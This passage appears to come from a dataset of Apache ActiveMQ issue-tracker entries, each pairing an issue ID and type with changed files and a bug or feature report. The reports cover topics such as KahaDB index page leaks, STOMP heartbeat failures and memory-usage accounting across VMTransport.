texts:offline durable subs with selectors can lead to page leaks in the index and bloat of db.data in kahadb
There is a page leak in the index, related to durable subs with selectors. producing and consuming past variable limits demonstrate incremental growth in the db.data, the in-use page count increases
issueID:AMQ-4095
type:Bug
changed files:NIOOutputStream.java
texts:Problem with STOMP NIO + SSL
Problem found with STOMP+NIO+SSL: broker with STOMP+NIO+SSL start a queue consumer send a large (>= 16kB) message the consumer will hang, not receiving the full messagehttp://activemq.2283324.n4.nabble.com/DISCUSS-ActiveMQ-5-7-release-td4656244.html#a4657240
issueID:AMQ-4098
type:Bug
changed files:
texts:ActiveMQ 5.7 - Misses some binary files in the release kit
See nabblehttp://activemq.2283324.n4.nabble.com/ActiveMQ-5-7-0-startup-error-broker-ks-missing-tp4657622.html;cid=1349764415189-189
issueID:AMQ-4100
type:Bug
changed files:StompSocket.java
ProtocolConverter.java
texts:WebSocket connections not cleaned
When there"s transport timeout or broker is shut, the MBean is not properly cleaned.
issueID:AMQ-4103
type:Bug
changed files:
texts:LeaseDatabaseLocker can not be changed from 5 sec poll
LeaseDatabaseLocker the default config runs after the setter thus always setting a 5 sec check no matter the config.
issueID:AMQ-4104
type:Bug
changed files:
texts:STOMP 1.1 CONNECTED Frame has erroneously encoded headers
The STOMP 1.1 specification says:All frames except the CONNECT and CONNECTED frames will also escape any colon or newline octets found in the resulting UTF-8 encoded headers. ...... The CONNECT and CONNECTED frames do not escape the colon or newline octets in order to remain backward compatible with STOMP 1.0.AMQ 5.7.0 is out of specification with regard to this.Example telnet session:$ telnet tjjackson 61613Trying 192.168.1.200...Connected to tjjackson.Escape character is "^]".CONNECTlogin:mepasscode:asdasdaccept-version:1.1host:tjjacksonheart-beat:10000,15000^@CONNECTEDheart-beat:15000,10000session:IDctjjackson-55318-1350137693500-2c1server:ActiveMQ/5.7.0version:1.1
issueID:AMQ-4106
type:Bug
changed files:
texts:STOMP+NIO and Heartbeats gives consistent InactivityIOException
When a stomp 1.1 client:a) connects to a stomp+nio transportb) elects to send heartbeats when the network is idlethe first several heartbeat sends appear to succeed, but then the connection is forcibly closed by the broker.From activemq.log:2012-10-14 09:53:07,755 | WARN  | Transport Connection to: tcp://127.0.0.1:36440 failed: org.apache.activemq.transport.InactivityIOException: Channel was inactive for too (>10000) long: tcp://127.0.0.1:36440 | org.apache.activemq.broker.TransportConnection.Transport | ActiveMQ InactivityMonitor WorkerFrom wrapper.log:INFO   | jvm 1    | 2012/10/14 09:53:07 |  WARN | Transport Connection to: tcp://127.0.0.1:36440 failed: org.apache.activemq.transport.InactivityIOException: Channel was inactive for too (>10000) long: tcp://127.0.0.1:36440I am able to reproduce this with either:a) the current Ruby stomp gemb) the current golang stompngo packageIt is unclear to me whether:a) the AMQ heartbeat code is not tolerant as the specification suggestsb) the AMQ heartbeat receiver is not reading or recognizing heartbeats at allIn all cases these tests succeed with either:a) AMQ 5.7.0 stomp without niob) Apolloc) RabbitMQd) a client that only receives heartbeats, but does not send themI will attach a Ruby client example shortly.
issueID:AMQ-4107
type:Bug
changed files:
texts:Message order can be broken for Topic under a high load when topicPrefetch=1 and comsumer is slow
For <amq:policyEntry topic=">" producerFlowControl="true" memoryLimit="30mb" topicPrefetch="1" blockedProducerWarningInterval="30">Short excerpt from TopicSubscription class:public void add(MessageReference node) throws Exception {…..              if (!isFull() && matched.isEmpty()  && !isSlave()) {            // if maximumPendingMessages is set we will only discard messages which            // have not been dispatched (i.e. we allow the prefetch buffer to be filled)       dispatch(node);                   <- Second message will go this way and might be dispatched sooner than first one.            setSlowConsumer(false);        } else {…….if (matched.tryAddMessageLast(node, 10)) {    <- first message will be put in the VMCursor queue and might be dispatched later         break;                        }..... dispatchMatched();   <- First message won"t be dispatched immediately because !isFull() is still false}Possible scenario as I can see it from logs:1. First message has arrived and !isFull() is false because consumer didn"t take some previous message yet.2. First message will be processed by tryAddMessageLast in VMPendingMessageCursor class and will be dispatched very lately because !isFull() is still false.3. Meanwhile consumer reads some previous message and !isFull() will return true.    4. Second message will be dispatched immediately and might be first to be delivered. 5. Then first message is dispatched.6. Message order is broken.
issueID:AMQ-4108
type:Bug
changed files:
texts:Cannot receive &#39;ActiveMQ.Advisory.MasterBroker&#39; messages when master dies and slave takes control
Message consumers do not receive "ActiveMQ.Advisory.MasterBroker" advisory messages when the master is killed and the slave takes over.Steps:1) Start Master and Slave brokers in Pure "Master / Slave" Configuration.2) Create a client consumer for the "ActiveMQ.Advisory.MasterBroker" topic. (See code below)3) Kill the Master broker. (kill -9)4) The client will failover to the slave. Note the Web Console shows there is one en-queued message for the "ActiveMQ.Advisory.MasterBroker" topic.5) The consumer will never receive/dequeue this message. (Event after restarting the client)Two other observations:1) Other advisories (such as the "ActiveMQ.Advisory.Connection")are working. This only seems to be a problem with "ActiveMQ.Advisory.MasterBroker".2) Sending a message to the "ActiveMQ.Advisory.MasterBroker" topic via the Web Console is properly received and dequeued by the consumer.Code:Session session = conn.createSession(false, Session.AUTO_ACKNOWLEDGE);MessageConsumer consumer = session.createConsumer( AdvisorySupport.getMasterBrokerAdvisoryTopic() );// It will receive Connection Advisory messages! Just not MasterBroker advisory messages //MessageConsumer consumer = session.createConsumer( AdvisorySupport.getConnectionAdvisoryTopic() );Message msg = null;while (true) {        // Also doesn"t work with MessageListener implementation        msg = consumer.receive(30000);        System.out.println(name + " Received: " + msg);}
issueID:AMQ-4110
type:Bug
changed files:WebClient.java
MessageQuery.java
texts:Web console can&#39;t send messages to the secured broker
When trying to send a message to the secured broker from web console you"ll get the javax.jms.JMSException: User name [null] or password is invalid.error, meaning that"s the only operation that doesn"t use proper credentials
issueID:AMQ-4112
type:Task
changed files:
texts:Upgrade to MQTT Client 1.4
We should upgrade from 1.3 to 1.4
issueID:AMQ-4115
type:Bug
changed files:
texts:Make sure there&#39;s no XSS in web demos
We need to ensure that everything is properly escaped when displayed in the browser
issueID:AMQ-4116
type:Bug
changed files:
texts:Memory usage is not cleared from the source queue when a message is moved to another queue over the VMTransport
Reproduction============Using VMTransport:1. Produce a message on queue A and verify that queue A"s memory usage increases2. Consume the message from queue A and verify that queue A"s memory usage decreases.3. Resend the message to queue B.Expected: Queue A"s memory usage is not increased by the enqueue to queue B.Actual: Queue A"s memory usage increases and no memory usage increase occurs on queue B.Symptom=======When messages are moved between queues using the VMTransport, they continue to contribute to the memory usage of the source queue rather than the destination queue.The correct behaviour (memory usage decreases from queue A and increases in queue B) is exhibited by non-VMTransport (e.g., TCP).Cause=====When the message is first sent to queue A, it"s memoryUsage field is set to match queue A"s:org.apache.activemq.broker.region.Queuepublic void send(final ProducerBrokerExchange producerExchange, final Message message) throws Exception {    final ConnectionContext context = producerExchange.getConnectionContext();    // There is delay between the client sending it and it arriving at the    // destination.. it may have expired.    message.setRegionDestination(this);...org.apache.activemq.command.Messagepublic void setRegionDestination(org.apache.activemq.broker.region.Destination destination) {    this.regionDestination = destination;    if(this.memoryUsage==null) {        this.memoryUsage=regionDestination.getMemoryUsage();    }}As the message moves across the transport, it is copied along with the memoryUsage field:org.apache.activemq.command.Messageprotected void copy(Message copy) {    super.copy(copy);...    copy.memoryUsage=this.memoryUsage;...When the message is sent to the second queue, memoryUsage is non-null, so setRegionDestination(...) does not update memoryUsage to reflect the new destination queue.When the destination queue accepts the message, the memoryUsage of the source queue is (incorrectly) increased:org.apache.activemq.command.Messagepublic int incrementReferenceCount() {    int rc;    int size;    synchronized (this) {        rc = ++referenceCount;        size = getSize();    }    if (rc == 1 && getMemoryUsage() != null) {        getMemoryUsage().increaseUsage(size);This mal-behaviour is not exhibited by other transports since they serialize Message and memoryUsage is transient.  As a result, the call to setRegionDestination(...) will properly update memoryUsage when the message arrives at the destination queue.Solution========There are a number of possible solutions, any of which would correct the behaviour (although I am unsure what side-effects they may have on other behaviour):1. It seems odd that memoryUsage is copied when Message is copied.  If Message.copy(...) is used as a shortcut to avoid serialization/deserialization on VMTransport, then it should have the same semantics and avoid copying transient fields.2. It seems odd that setRegionDestination(...) would not always set the memoryUsage to match the destination"s memoryUsage.3. ActiveMQConnection has a comment regarding concessions made for messages transmitted by the VM transport:org.apache.activemq.ActiveMQConnectionpublic void onCommand(final Object o) {    final Command command = (Command)o;    if (!closed.get() && command != null) {        try {            command.visit(new CommandVisitorAdapter() {                @Override                public Response processMessageDispatch(MessageDispatch md) throws Exception {                    waitForTransportInterruptionProcessingToComplete();                    ActiveMQDispatcher dispatcher = dispatchers.get(md.getConsumerId());                    if (dispatcher != null) {                        // Copy in case a embedded broker is dispatching via                        // vm://                        // md.getMessage() == null to signal end of queue                        // browse.                        Message msg = md.getMessage();                        if (msg != null) {                            msg = msg.copy();                            msg.setReadOnlyBody(true);                            msg.setReadOnlyProperties(true);                            msg.setRedeliveryCounter(md.getRedeliveryCounter());                            msg.setConnection(ActiveMQConnection.this);                            md.setMessage(msg);                        }                        dispatcher.dispatch(md);                    }                    return null;                }Adding a call to msg.setMemoryUsage(null) would address this bug.The latter appears to be the least intrusive, although it will only address the case of VMTransport messages moving between producers/consumers. Queue contains shortcut methods for moving messages between queues (e.g., copyMessageTo).  I have not verified if these methods exhibit the same behaviour re: memory usage, but if so, they would not be addressed by patching ActiveMQConnection.Our main concern is with the reported use case, so I"ve attached a patch for ActiveMQConnection and unit test to demonstrate the behaviour.
issueID:AMQ-4117
type:Bug
changed files:MQTTInactivityMonitor.java
MQTTProtocolConverter.java
MQTTWireFormat.java
texts:MQTT Inactivity Monitor doesn&#39;t respect client keep alive setting.
The MQTT Inactivity Monitor starts its monitoring thread to early which means that it cannot honor the keepAlive time sent by the client.  The transport should wait until its received the client CONNECT command before it starts its monitoring thread.
issueID:AMQ-4118
type:Bug
changed files:
texts:Index page overflow (when a value does not fit in a page) can lead to duplicate calls to free
An overflowed chain is release when it is no longer needed, but the new end page was not stored in the cache, the old value as a part page is reused and freed again. boom. Keeping the cache in sync sorts this.A workaround is to disable the index page cache with a small indexCacheSize.Durable subs make this more visible, but the failure symptoms vary with usage. A typical scenario is a classcast when the page is reused in the wrong context or a npe when the free page is loaded from disk.With durable subs with selectors and large backlogs, the sequence set expansion and shrinkage produces values that can overflow easily. This scenario produced a nice test.Some resultant stack traces that are symptomatic:2012-10-19 22:25:11,928 [exPageUsage#5-2] - ERROR MessageDatabase                - KahaDB failed to store to Journaljava.io.EOFException: Chunk stream does not exist, page: 1344 is marked free at org.apache.kahadb.page.Transaction$2.readPage(Transaction.java:481) at org.apache.kahadb.page.Transaction$2.<init>(Transaction.java:458) at org.apache.kahadb.page.Transaction.openInputStream(Transaction.java:455) at org.apache.kahadb.page.Transaction.load(Transaction.java:431) at org.apache.kahadb.page.Transaction.load(Transaction.java:388) at org.apache.kahadb.index.BTreeIndex.loadNode(BTreeIndex.java:262) at org.apache.kahadb.index.BTreeNode.getChild(BTreeNode.java:225) at org.apache.kahadb.index.BTreeNode.getLeafNode(BTreeNode.java:680) at org.apache.kahadb.index.BTreeNode.get(BTreeNode.java:562) at org.apache.kahadb.index.BTreeIndex.get(BTreeIndex.java:184) at org.apache.activemq.store.kahadb.MessageDatabase$MessageOrderIndex.get(MessageDatabase.java:2616) at org.apache.activemq.store.kahadb.MessageDatabase.updateIndex(MessageDatabase.java:1210) at org.apache.activemq.store.kahadb.MessageDatabase$15.execute(MessageDatabase.java:1002) at org.apache.kahadb.page.Transaction.execute(Transaction.java:790) at org.apache.activemq.store.kahadb.MessageDatabase.process(MessageDatabase.java:1000) at org.apache.activemq.store.kahadb.MessageDatabase$13.visit(MessageDatabase.java:933) at org.apache.activemq.store.kahadb.data.KahaRemoveMessageCommand.visit(KahaRemoveMessageCommand.java:220) at org.apache.activemq.store.kahadb.MessageDatabase.process(MessageDatabase.java:925) at org.apache.activemq.store.kahadb.MessageDatabase.store(MessageDatabase.java:837) at org.apache.activemq.store.kahadb.MessageDatabase.store(MessageDatabase.java:819) at org.apache.activemq.store.kahadb.KahaDBStore$KahaDBTopicMessageStore.doAcknowledge(KahaDBStore.java:723) at org.apache.activemq.store.kahadb.KahaDBStore$KahaDBTopicMessageStore.acknowledge(KahaDBStore.java:706) at org.apache.activemq.store.kahadb.KahaDBTransactionStore.acknowledge(KahaDBTransactionStore.java:519) at org.apache.activemq.store.kahadb.KahaDBTransactionStore$2.acknowledge(KahaDBTransactionStore.java:222) at org.apache.activemq.broker.region.Topic.acknowledge(Topic.java:528) at org.apache.activemq.broker.region.DurableTopicSubscription.acknowledge(DurableTopicSubscription.java:279) at ..java.lang.ClassCastException: java.lang.Long cannot be cast to java.lang.String        at java.lang.String.compareTo(String.java:92)        at java.util.Arrays.binarySearch0(Arrays.java:2001)        at java.util.Arrays.binarySearch(Arrays.java:1943)        at org.apache.kahadb.index.BTreeNode.put(BTreeNode.java:371)        at org.apache.kahadb.index.BTreeNode.put(BTreeNode.java:369)               at org.apache.kahadb.index.BTreeIndex.put(BTreeIndex.java:189)        at org.apache.activemq.store.kahadb.MessageDatabase$MessageOrderIndex.put(MessageDatabase.java:2592)        at org.apache.activemq.store.kahadb.MessageDatabase.upadateIndex(MessageDatabase.java:1168)        at org.apache.activemq.store.kahadb.MessageDatabase$AddOpperation.execute(MessageDatabase.java:2082)        at org.apache.activemq.store.kahadb.MessageDatabase$18.execute(MessageDatabase.java:1095)        at org.apache.kahadb.page.Transaction.execute(Transaction.java:768)        at org.apache.activemq.store.kahadb.MessageDatabase.process(MessageDatabase.java:1092)        at org.apache.activemq.store.kahadb.MessageDatabase$13.visit(MessageDatabase.java:961)        at org.apache.activemq.store.kahadb.data.KahaCommitCommand.visit(KahaCommitCommand.java:130)        at org.apache.activemq.store.kahadb.MessageDatabase.process(MessageDatabase.java:943)        at org.apache.activemq.store.kahadb.MessageDatabase.store(MessageDatabase.java:855)        at org.apache.activemq.store.kahadb.KahaDBTransactionStore.commit(KahaDBTransactionStore.java:267)        at org.apache.activemq.transaction.XATransaction.storeCommit(XATransaction.java:85)...java.lang.NullPointerException        at org.apache.kahadb.index.BTreeIndex.loadNode(BTreeIndex.java:264)        at org.apache.kahadb.index.BTreeNode.getChild(BTreeNode.java:225)        at org.apache.kahadb.index.BTreeNode.getLeafNode(BTreeNode.java:676)        at org.apache.kahadb.index.BTreeNode.put(BTreeNode.java:369)        at org.apache.kahadb.index.BTreeIndex.put(BTreeIndex.java:189)        at org.apache.activemq.store.kahadb.MessageDatabase$MessageOrderIndex.put(MessageDatabase.java:2592)        at org.apache.activemq.store.kahadb.MessageDatabase.upadateIndex(MessageDatabase.java:1168)        at org.apache.activemq.store.kahadb.MessageDatabase$AddOpperation.execute(MessageDatabase.java:2082)        at org.apache.activemq.store.kahadb.MessageDatabase$18.execute(MessageDatabase.java:1095)        at org.apache.kahadb.page.Transaction.execute(Transaction.java:768)        at org.apache.activemq.store.kahadb.MessageDatabase.process(MessageDatabase.java:1092)        at org.apache.activemq.store.kahadb.MessageDatabase$13.visit(MessageDatabase.java:961)        at org.apache.activemq.store.kahadb.data.KahaCommitCommand.visit(KahaCommitCommand.java:130)        at org.apache.activemq.store.kahadb.MessageDatabase.process(MessageDatabase.java:943)        at org.apache.activemq.store.kahadb.MessageDatabase.store(MessageDatabase.java:855)        at org.apache.activemq.store.kahadb.KahaDBTransactionStore.commit(KahaDBTransactionStore.java:267)
issueID:AMQ-4119
type:New Feature
changed files:DestinationViewMBean.java
DestinationView.java
texts:Add memory usage *count* to destination MBean for better detection of memory leaks
We"ve been doing a lot of tuning of memory usage limits and exploring the behaviour of producer flow control when these limits are reached.  In so doing, we"ve wanted to validate that memory usage counts are not leaking (e.g., as a result of bugs like AMQ-4116).In particular, we want to verify that after a large flood of messages is processed and queues become empty, the memory usage on each queue resets to 0.The existing MBean for queues/topics shows "MemoryPercentUsage" but not the actual bytes that the queue thinks it is using.  For large limits, the MemoryPercentUsage can report 0% while there is actually some memory usage remaining.  In this case, it is difficult to detect leaks without running many test iterations until the MemoryPercentUsage increments.Knowing the actual byte count of memory usage is also a more direct way of determining appropriate limits, since these limits themselves are expressed in bytes.Attached is a simple patch that adds a "MemoryUsage" attribute to the destination MBean.
issueID:AMQ-4121
type:New Feature
changed files:DestinationFilter.java
BaseDestination.java
Destination.java
texts:Expose Destination.setMemoryUsage so that custom policies can override default MemoryUsage (e.g., to specify message count limits)
Using queues as an example, but this also applies to topics...When a queue is created, it inherits the System-wide (broker) usage manager and its limits.  A policy can be applied to the queue in order to specify a destination-specific memory usage limit:<policyEntry queue=">" producerFlowControl="true" memoryLimit="1mb"> ...This policy entry is still dependent on the existing org.apache.activemq.usage.MemoryUsage class:org.apache.activemq.broker.region.policy.PolicyEntrypublic void configure(Broker broker,Queue queue) {    baseConfiguration(broker,queue);    if (dispatchPolicy != null) {        queue.setDispatchPolicy(dispatchPolicy);    }    queue.setDeadLetterStrategy(getDeadLetterStrategy());    queue.setMessageGroupMapFactory(getMessageGroupMapFactory());    if (memoryLimit > 0) {        queue.getMemoryUsage().setLimit(memoryLimit);    }...We wanted to create a usage policy that would limit the number of messages in a queue by count (i.e., max 1000 messages) rather than by memory usage.The existing usage strategies are memory-centric.  It would be nice if a destination had a generic Usage property rather than a specific MemoryUsage property, but barring refactoring the interfaces, it would be possible to achieve our goal if we could set the MemoryUsage property of a queue; this is as simple as adding a Destination.setMemoryUsage(MemoryUsage) property go with the existing Destination.getMemoryUsage(MemoryUsage) property.The attached patch contains the trivial changes to expose Destination.setMemoryUsage.  The patch also includes an example of an extended policy that allows a discrete (i.e., count based) usage policy on queues.  Rather than enforcing a specific limit to the number of messages in a queue, this policy determines the limit as a multiple of the number of consumers.  It would be even easier to do the former, but our use case required the latter.  Also note that this consumer-ratio policy is orthogonal to the consumer prefetch limit &#8212; it"s a policy that we needed to prevent a distributed queue with many messages from being completely drained to a remote broker during startup (i.e., before additional brokers had started).Example of ExtendedPolicy configuration<bean class="com.invoqsystems.foundation.activemq.ExtendedPolicyEntry">    <property name="queue" value="shared.notification.*" />    <property name="messageToConsumerRatioLimit" value="99" /></bean>com.invoqsystems.foundation.activemq.ExtendedPolicyEntrypublic class ExtendedPolicyEntry extends PolicyEntry {    private long messageToConsumerRatioLimit;    /**     * This is called by AMQ when a queue is first created. If a message-to-consumer ratio is specified, a     * {@link DiscreteMemoryUsage} class with a {@link ConsumerRatioUsageCapacity} limiter replaces the queue"s     * byte-based MemoryUsage class. The original parent of the queue"s byte-based MemoryUsage becomes the parent of the     * {@link DiscreteMemoryUsage}, so it will also receive updates and can signal when the queue is full (e.g., because     * of queue or system memory limits).     */    @Override    public void configure(Broker broker, Queue queue) {        super.configure(broker, queue);        if (messageToConsumerRatioLimit > 0) {            DiscreteMemoryUsage ratioUsage = new DiscreteMemoryUsage(queue.getMemoryUsage().getParent(), ":ratio");            ratioUsage.setLimiter(new ConsumerRatioUsageCapacity(queue));            ratioUsage.setLimit(messageToConsumerRatioLimit);            ratioUsage.setParent(queue.getMemoryUsage());            ratioUsage.setExecutor(queue.getMemoryUsage().getExecutor());            queue.setMemoryUsage(ratioUsage);        }    }...
issueID:AMQ-4122
type:Bug
changed files:
texts:Lease Database Locker failover broken
We are using ActiveMQ 5.7.0 together with a mysql database and could not observe correct failover behavior with lease database locker.It seems that there is a race condition, which prevents the correct failover procedure.We noticed that when starting up two instances, both instance are becoming master.We did several test, including the following and could not observe intended functionality: shutdown all instances manipulate database lock that one node has lock and set expiry time in distance future start up both instances. both instances are unable to acquire lock, as the lock hasn"t expired, which should be correct behavior. update the expiry time in database, so that the lock is expired. first instance notices expired lock and becomes master when second instance checks for lock, it also updates the database and becomes master.To my understanding the second instance should not be able to update the lock, as it is held by the first instance and should not be able to become master.
issueID:AMQ-4123
type:Bug
changed files:
texts:Improve MQTT Inactivity Monitoring
Keep Alive should be 1.5 * the keep alive value specified by client (the grace period described in spec: http://public.dhe.ibm.com/software/dw/webservices/ws-mqtt/mqtt-v3r1.html) MQTTInactivityMonitor checking for KeepAliveInfo in the onCommand, but it can never get a KeepAliveInfo as it is What to do when user explicitly turns Inactivity Monitor off? Should there be defaults to close potentially dead connections?
issueID:AMQ-4124
type:Improvement
changed files:
texts:Disable sample web application from out of the box broker
The out of the box broker you can start with bin/activemq includes a sample web application. We should disable this web app as people dont want to run this in the production broker. Instead we should have instructions to startup the broker with a activemq-demo.xml file that has the sample instead.See nabblehttp://activemq.2283324.n4.nabble.com/DISCUSS-ActiveMQ-out-of-the-box-Should-not-include-the-demos-tp4658044.html
issueID:AMQ-4125
type:Improvement
changed files:KahaPersistenceAdapter.java
AMQPersistenceAdapter.java
texts:deprecate kaha and amq store - kahadb is now well proven
To reduce maintenance going forward, the old kaha and amq stores should be deprecated. future work will concentrate on jdbc, kahadb and leveldb after 5.8
issueID:AMQ-4126
type:Bug
changed files:
texts:stomp+nio+ssl + jaasDualAuthenticationPlugin + certificate authentication fails
Hello,ActiveMQ"s trunk currently fails for the current use case: server: stomp+nio+ssl connector + jaasDualAuthenticationPlugin client: connecting to the server and expecting private certificate authenticationUnit test reproducing the problem provided.2012-10-23 17:13:01,207 [MQ NIO Worker 4] - WARN  ProtocolConverter              - Exception occurred processing: CONNECT^@: java.lang.SecurityException: User name [null] or password is invalid.2012-10-23 17:13:01,210 [MQ NIO Worker 4] - WARN  Transport                      - Transport Connection to: tcp://128.141.156.34:59500 failed: java.io.IOException: User name [null] or password is invalid.
issueID:AMQ-4129
type:Improvement
changed files:
texts:Add support for Stomp v1.2
Stomp v1.2 spec has been released.  We should add support for it in a future release.
issueID:AMQ-4132
type:Bug
changed files:
texts:Openwire+nio+ssl require to specify transport.enabledCipherSuites property
Hello,trying the openwire+nio+ssl connector I noticed that it requires to declare the transport.enabledCipherSuites connector property or it results in an EOF exception. Is this intended?It is not the case with the other ssl connectors.Unit test attached.
issueID:AMQ-4133
type:Bug
changed files:
texts:Different behaviour with similar connectors with identical option, URI validation would be nice to have
Hello,we noticed an inconsistent behaviour of stomp+ssl and stomp+nio+ssl with same connector options. stomp+ssl works with both transport.needClientAuth=true and needClientAuth=true options stomp+nio+ssl works with transport.needClientAuth=true but not with needClientAuth=trueIn this last case it fails with a non-obvious exception:junit.framework.ComparisonFailure: java.lang.SecurityException: Unable to authenticate transport without SSL certificate.        at org.apache.activemq.security.JaasCertificateAuthenticationBroker.addConnection(JaasCertificateAuthenticationBroker.java:74)        at org.apache.activemq.security.JaasDualAuthenticationBroker.addConnection(JaasDualAuthenticationBroker.java:98)It would be nice to have a URI parameters validation or the same behaviour with similar connectors.What do you think?Unit test which shows the problem attached, sorry for reusing pieces from another bug.
issueID:AMQ-4134
type:Bug
changed files:
texts:Add XA support to the LevelDB store.
None
issueID:AMQ-4137
type:New Feature
changed files:TarUtils.java
pom.xml
data.proto
TarInputStream.java
StoreExporter.java
TarBuffer.java
ExportStreamManager.java
ShellCommand.java
TarConstants.java
TarEntry.java
StoreExportCommand.java
TarOutputStream.java
texts:Create a store import/export command line tool to covert between store types
Ideally is should be compatible with the Apollo store export/import file format.
issueID:AMQ-4140
type:Bug
changed files:
texts:maven-activemq-plugin fails to resolve path to XBean file in multi-module builds, and does not have a skip flag
Hi,I am using ActiveMQ and have some integration tests leveraging the maven-activemq-plugin.I have found that:1. path to XBean files are not resolved properly, as: the path is relative, and therefore, multi-module builds fail; at least under Windows, the generated path is not a valid URL, hence the plugin fails on this call: final BrokerService broker = BrokerFactory.createBroker(configUri);2. unlike other Maven plugins, maven-activemq-plugin doesn"t follow the convention of having a skip flag, to skip execution under some circumstances. This is not a bug, but rather an improvement that would make users" life easier IMO (and at least, mine).In the attachments, I have provided: a multi-module build that would allow you to easily and systematically replicate the above two issues: maven-activemq-plugin-user-acceptance-test.zip a "fixed" version of maven-activemq-plugin, based on trunk / 5.8-SNAPSHOT (as of 2012/10/28 06:34 BST): maven-activemq-plugin.zip a patch, containing the equivalent fix, in case this format is preferred: maven-activemq-plugin.patchI hope this will help to have this resolved in a 5.7.1 or 5.8 version of the plugin very soon? Cheers,M.P.S. : In case you need committers, I would be happy to occasionally help.(I noticed the documentation for this plugin is rather outdated, so could help with that at least)
issueID:AMQ-4142
type:Bug
changed files:
texts:SimpleAuthenticationPluginTest hangs intermittently on Hudson
The SimpleAuthenticationPluginTest sometimes hangs on Hudson
issueID:AMQ-4144
type:New Feature
changed files:PropertyExpression.java
texts:When used in a message selector, the JMSDeliveryMode header field should be treated as having the values &#39;PERSISTENT&#39; and &#39;NON_PERSISTENT&#39;.
Causes a small JMS spec selector violation.  Right now JMSDeliveryMode is evaluating to 1 or 2.
issueID:AMQ-4145
type:Bug
changed files:
texts:IntrospectionSupport does not convert from primitive to Wrapper classes appropriately
In the TcpTransportServer#handleSocket method, we see that the default values for certain options (among them, trace, maxInactivityDuration, soTimeout, etc) are converted to their wrapper equivalents. However in IntrospectionSupport#convert(Object value, Class to) the conversion is not done properly. It always throws the IllegalArgumentException. Found in this message trail, although can be seen in other attempts to set variables directly on the transport server.Possibly related to changes for AMQ-3797 ??
issueID:AMQ-4146
type:New Feature
changed files:
texts:String properties in JMS selector expression should not get auto converted to numbers per spec.
None
issueID:AMQ-4147
type:Bug
changed files:
texts:Memory usage incorrectly updated across network of brokers when VMTransport is used.
Symptom=======I was writing some unit tests based on org.apache.activemq.JmsMultipleBrokersTestSupport, and noticed the following issue:When brokers are connected in a network using VMTransport (i.e., VMTransport on both the local and remote ends of a bridge), and a message moves from broker1 to broker2, the memory usage of the message continues to be accounted for on broker1 until the message is actually consumed on broker2.  If the brokers are bridged using a non-VM transport (e.g., TCP), memory usage on broker1 is reduced as soon as the message is bridged to broker2, and broker2"s memory usage increases until the message is consumed.Cause=====The cause is the same as in AMQ-4116: Message.copy() copies the memoryUsage object.  As a result, when the message moves from broker1 to broker2, the original memoryUsage object, which refers to broker1 is copied through to broker2 and never updated to broker2"s memoryUsage object.Specifically, the message is copied from the local transport before being sent to the remote transport by this code:DemandForwardingBridgeSupport.javaprotected void serviceLocalCommand(Command command) {    if (!disposed.get()) {        try {            if (command.isMessageDispatch()) {                enqueueCounter.incrementAndGet();                final MessageDispatch md = (MessageDispatch) command;                final DemandSubscription sub = subscriptionMapByLocalId.get(md.getConsumerId());                if (sub != null && md.getMessage() != null && sub.incrementOutstandingResponses()) {                    if (suppressMessageDispatch(md, sub)) {                        if (LOG.isDebugEnabled()) {                            LOG.debug(configuration.getBrokerName() + " message not forwarded to " + remoteBrokerName + " because message came from there or fails networkTTL, brokerPath: " + Arrays.toString(md.getMessage().getBrokerPath()) + ", message: " + md.getMessage());                        }                        // still ack as it may be durable                        try {                            localBroker.oneway(new MessageAck(md, MessageAck.INDIVIDUAL_ACK_TYPE, 1));                        } finally {                            sub.decrementOutstandingResponses();                        }                        return;                    }                    Message message = configureMessage(md);...protected Message configureMessage(MessageDispatch md) {    Message message = md.getMessage().copy();...This bug is not present when a non-VM transport is used for the bridge because Message.memoryUsage is marked transient not copied during serialization/deserialization over the transport.Solution========Since this is at least the second bug to result from the current Message.copy() behaviour, I think "Solution 1" proposed from AMQ-4116 is starting to look attractive as both a solution to AMQ-4116 and this bug:Modify Message.copy() so that it sets the resulting message"s memoryUsage object to null.  This would make Message.copy() behave more similarly to serialization/deserialization.
issueID:AMQ-4148
type:Bug
changed files:
texts:Static subscriptions from network bridges do not respect TTL (off by one in calculation), resulting in duplicate consumers.
Symptom=======The remote broker path is not set on network consumers that result from static subscriptions; as a result, they are forwarded to other bridges even when the network TTL on the bridges is 1.  In an n+1 hub-and-spoke network, the next broker to join receives n subscriptions instead of 1.Cause=====A consumer for a static subscriptions is created by the following code:DemandForwardingBridgeSupport.javaprivate void startLocalBridge() throws Throwable {...    if (!disposed.get()) {            setupStaticDestinations();        } else {            LOG.warn("Network connection between " + localBroker + " and " + remoteBroker + "(" + remoteBrokerName + ") was interrupted during establishment.");        }    }}/** * Subscriptions for these destinations are always created */protected void setupStaticDestinations() {...            DemandSubscription sub = createDemandSubscription(dest);            try {                addSubscription(sub);            } catch (IOException e) {                LOG.error("Failed to add static destination " + dest, e);            }            if (LOG.isTraceEnabled()) {                LOG.trace("bridging messages for static destination: " + dest);            }        }    }}final protected DemandSubscription createDemandSubscription(ActiveMQDestination destination) {    ConsumerInfo info = new ConsumerInfo();    info.setDestination(destination);    // the remote info held by the DemandSubscription holds the original consumerId,    // the local info get"s overwritten    info.setConsumerId(new ConsumerId(localSessionInfo.getSessionId(), consumerIdGenerator.getNextSequenceId()));    DemandSubscription result = null;    try {        result = createDemandSubscription(info);    } catch (IOException e) {        LOG.error("Failed to create DemandSubscription ", e);    }    return result;}Note how the broker path is not set on the ConsumerInfo that is used for the subscription.  In contrast, a consumer for a dynamic subscription does have its broker path updated to indicate that it is from a remote broker:DemandForwardingBridgeSupport.javaprotected void serviceRemoteCommand(Command command) {    if (!disposed.get()) {        try {            if (command.isMessageDispatch()) {                safeWaitUntilStarted();                MessageDispatch md = (MessageDispatch) command;                serviceRemoteConsumerAdvisory(md.getMessage().getDataStructure());                ackAdvisory(md.getMessage());...private void serviceRemoteConsumerAdvisory(DataStructure data) throws IOException {...        if (addConsumerInfo(info)) {                if (LOG.isDebugEnabled()) {                    LOG.debug(configuration.getBrokerName() + " bridged sub on " + localBroker + " from " + remoteBrokerName + " : " + info);                }            } else {                if (LOG.isDebugEnabled()) {                    LOG.debug(configuration.getBrokerName() + " Ignoring sub from " + remoteBrokerName + " as already subscribed to matching destination : " + info);                }            }        }...protected boolean addConsumerInfo(final ConsumerInfo consumerInfo) throws IOException {    boolean consumerAdded = false;    ConsumerInfo info = consumerInfo.copy();    addRemoteBrokerToBrokerPath(info);...Because of this difference, a static subscription will be forwarded to new bridges with a null brokerPath while a dynamic subscription to the same queue will be forwarded with a singleton brokerPath.  As a result, static subscriptions will be propagated one further hop than their dynamic counterparts.  In the case of a network TTL of 1, the 